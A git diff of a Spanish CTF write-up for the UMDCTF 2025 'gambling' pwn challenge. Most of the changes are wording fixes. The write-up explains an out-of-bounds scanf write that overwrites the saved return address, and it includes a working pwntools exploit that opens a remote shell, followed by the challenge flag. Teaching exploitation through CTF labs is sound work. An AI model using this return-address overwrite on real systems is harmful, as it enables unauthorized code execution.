@@ -20,7 +20,7 @@ Dificultad: <font color=green>Fácil</font>
 
 ## Enunciado
 
-"I gambled all of my life savings in this program (i have no life savings)
+"I gambled all of my life savings in this program (i have no life savings).
 
 nc challs.umdctf.io 31005"
 
@@ -37,7 +37,7 @@ Archivos utilizados [aquí](https://github.com/k3sero/Blog_Content/tree/main/Com
 
 ## Analizando el reto
 
-En este reto tenemos el siguiente código principal.
+En este reto tenemos el siguiente código principal:
 
 ```c
 #include <stdio.h>
@@ -83,7 +83,8 @@ int main(void) {
 	}
 }
 ```
-Este código implementa un juego de apuestas donde el usuario ingresa números flotantes intentando adivinar un valor aleatorio generado. En la función `gamble()` compara los números ingresados con el número objetivo. Si este es acertado, entonces muestra por pantalla "You win" pero no entrega el premio ya que la función `print_money()` está comentada, la cual arroja una shell interactiva.
+
+Este código implementa un juego de apuestas donde el usuario ingresa números flotantes intentando adivinar un valor aleatorio generado. En la función `gamble()` compara los números ingresados con el número objetivo. Si este valor es acertado, entonces muestra por pantalla "You win" pero no entrega el premio ya que la función `print_money()` está comentada, la cual arroja una shell interactiva.
 
 Además el programa corre en bucle preguntando si queremos volver a jugar y finaliza cuando el usuario escribe "no".
 
@@ -93,9 +94,9 @@ Este código tiene una vulnerabilidad crítica y es que `f` es un vector de 4 `f
 
 Además se pasan 7 punteros definidos como `f`, `f+1`, `f+2`, `f+3`, `f+4`, `f+5` y `f+6` y justo los cuatro primeros están "dentro" de `f`, los tres últimos apuntan fuera del arreglo.
 
-Esto degenera en una vulnerabilidad `Out of Bound (OOB)` la cual ocurre cuando un programa accede a memoria fuera de los límites de un arreglo o buffer. En nuestro caso lo aprovecharemos para poder llegar a la función `print_money()` la cual nos dará una consola interactiva en el servidor.
+Esto degenera en una vulnerabilidad llamada `Out of Bound (OOB)` la cual ocurre cuando un programa accede a memoria fuera de los límites de un arreglo o buffer. En nuestro caso lo aprovecharemos para poder llegar a la función `print_money()` la cual nos dará una consola interactiva en el servidor.
 
-Para ello, primero tenemos que comprender cómo se sobreescribe en la pila.
+Para ello, primero tenemos que comprender cómo se sobrescribe en la pila.
 
 El binario `gambling` está compilado en 32 bits, por tanto la pila local se organiza aproximadamente de la siguiente manera.
 
@@ -109,7 +110,7 @@ El binario `gambling` está compilado en 32 bits, por tanto la pila local se org
 [ saved EIP ]    0x18–0x1B   ← aquí está la dirección de salto $eip
 ```
 
-Ahora, cada vez que `scanf` lee un `%lf` en, por ejemplo, `f+i`, escribe 8 bytes empezando en la posición de `f+i` de la siguiente forma:
+Cada vez que `scanf` lee un `%lf` en, por ejemplo, `f+i`, escribe 8 bytes empezando en la posición de `f+i` de la siguiente forma:
 
 1. Para `i=0…3` escribes dentro de `f[0]…f[3]` (aunque pisas dos floats a la vez).
 
@@ -121,7 +122,7 @@ Ahora, cada vez que `scanf` lee un `%lf` en, por ejemplo, `f+i`, escribe 8 bytes
 
 Llegados a este punto, podemos controlar la dirección de salto de nuestro programa, pero para ello necesitamos la dirección de memoria de la función `print_money()` para llegar a ejecutarla.
 
-Para ello ejecutamos `objdump` y dumpeamos las direcciones de memoria de cada instrucción de la siguiente manera.
+Para ello ejecutamos `objdump` y volcamos las direcciones de memoria de cada instrucción de la siguiente manera.
 
     ┌──(kesero㉿kali)-[~]
     └─$ objdump -d gambling
@@ -155,9 +156,9 @@ Para ello ejecutamos `objdump` y dumpeamos las direcciones de memoria de cada in
     80492f3:	d8 0d 70 a0 04 08    	fmuls  0x804a070
     80492f9:	d9 5c 24 14          	fstps  0x14(%esp)
 
-Listo! Sabemos que tenemos que saltar a la dirección `0x080492c0` para llegar a ejecutar la función `print_money()` la cual nos dará la consola interactiva, pero antes que nada tenemos que construir el valor `double` a enviar con la dirección obtenida.
+Listo! Sabemos que tenemos que saltar a la dirección `0x080492c0` para llegar a ejecutar la función `print_money()` la cual nos dará la consola interactiva, pero antes tenemos que construir el valor `double` a enviar con la dirección obtenida.
 
-Para ello queremos que esos 8 bytes que se imprimen en la posición de `f+6` contengan, en su mitad alta (los 4 bytes de más peso), la dirección de `print_money` (0x080492c0). Para ello construiremos la siguiente lógica.
+Para ello queremos que esos 8 bytes que se imprimen en la posición que `f+6` contenga, en su mitad alta (los 4 bytes de más peso), la dirección de `print_money` (0x080492c0). Para ello construiremos la siguiente lógica.
 
 ```py
 target_addr = 0x080492c0
@@ -171,7 +172,7 @@ Esa dirección en 64 bits corresponde a `0x080492c000000000` y en little-endian,
     00 00 00 00   c0 92 04 08
     ^—low—^       ^—high—^
 
-Por tanto, cuando scanf hace la séptima lectura `i=6`, escribe esos 8 bytes en el registro `$eip`.
+Por tanto, cuando `scanf` hace la séptima lectura `i=6`, escribe esos 8 bytes en el registro `$eip`.
 – Los 4 bytes más bajos (todos ceros) se van “más allá” pero no nos importan.
 – Los 4 bytes más altos (c0 92 04 08) acaban justo en saved EIP, convirtiéndolo en `0x080492c0`.
 
@@ -180,17 +181,18 @@ Por último pero importante, el salto a la función `print_money()` se ejecuta a
     leave   ; equivale a “mov esp, ebp; pop ebp”
     ret     ; pop [esp] → EIP
 
-En este código generado por el propio ensamblador, `leave` restaura el `esp` original y hace `pop ebp` (no importa el valor que lleve).
+En este código generado por el propio ensamblador, `leave` restaura el `esp` original y hace `pop ebp` (no importa el valor que este contenga).
 
 Además, `ret` hace `pop eip`, y como acabamos de sobrescribir saved EIP con `0x080492c0`, el procesador salta directamente a la función `print_money()`.
 
-El código final es el siguiente.
+El código final es el siguiente:
 
 ```py
 from pwn import *
 import struct
 
 p = remote("challs.umdctf.io", 31005) 
+
 #p = process("./gambling")
 
 #gdb.attach(p, gdbscript="""
@@ -216,18 +218,12 @@ p.sendlineafter("Enter your lucky numbers: ", inp )
 p.interactive()
 ```
 
-Una vez tenemos la `shell` interactiva, leemos la flag.
+Una vez tenemos la `shell` interactiva, leemos la flag en el servidor.
 
     ┌──(Server㉿server)-[~]
     └─$ cat flag.txt
 
     UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
-
-## P.D
-
-Agradecido por el manqueo de Víctor en el último momento para llegar y carrilear Pwn.
-
-![skill_issue](https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/UMDCTF2025/pwn/img/skill_issue.png)
 
 ## Flag
 `UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}`
